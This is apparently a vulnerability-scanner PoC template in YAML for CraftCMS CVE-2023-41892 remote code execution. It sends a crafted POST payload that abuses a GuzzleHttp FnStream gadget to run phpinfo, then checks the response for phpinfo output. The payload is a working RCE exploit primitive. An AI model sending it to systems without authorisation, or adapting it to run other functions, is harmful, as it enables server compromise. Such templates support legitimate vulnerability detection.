id: poc-yaml-craftcms-rce
info:
  name: CraftCMS CVE-2023-41892 远程代码执行漏洞
  severity: critical
  tags:
  - 两高一弱
  - rce
  - CVE-2023-41892
  finger: craft_cms
variables:
  url: '/

    /web/

    '
requests:
- method: POST
  path: '{{.url}}index.php'
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: 'action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as
    xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}

    '
  expression: "status_code == 200 && \ncontains(title,\"phpinfo\") &&\ncontains(body,\"\
    PHP Version\") &&\ncontains(body,\"PHP Extension\") &&\ncontains(body,\"<!DOCTYPE\
    \ html\")\n"
transport: http
